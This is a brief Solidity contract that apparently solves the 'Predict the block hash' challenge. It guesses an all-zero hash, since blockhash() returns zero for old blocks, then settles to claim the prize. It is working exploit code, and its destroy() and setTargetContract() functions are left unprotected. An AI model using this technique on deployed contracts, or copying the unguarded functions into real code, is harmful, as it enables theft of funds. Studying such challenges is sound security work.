pragma solidity ^0.4.21;

interface PredictTheBlockHashChallenge{
    function lockInGuess(bytes32 hashNum) external payable;
    function settle() external;
}

contract predictTheBlockHash{
    bytes32 answer = 0x0000000000000000000000000000000000000000000000000000000000000000;
    PredictTheBlockHashChallenge public target;

    function setTargetContract(address _target) public{
        target = PredictTheBlockHashChallenge(_target);
    }

    function guess() public{
        target.lockInGuess.value(1 ether)(answer);
    }

    function success() public {
        target.settle();
    }

    function destroy() public{
        selfdestruct(msg.sender);
    }

    function() external payable {}
}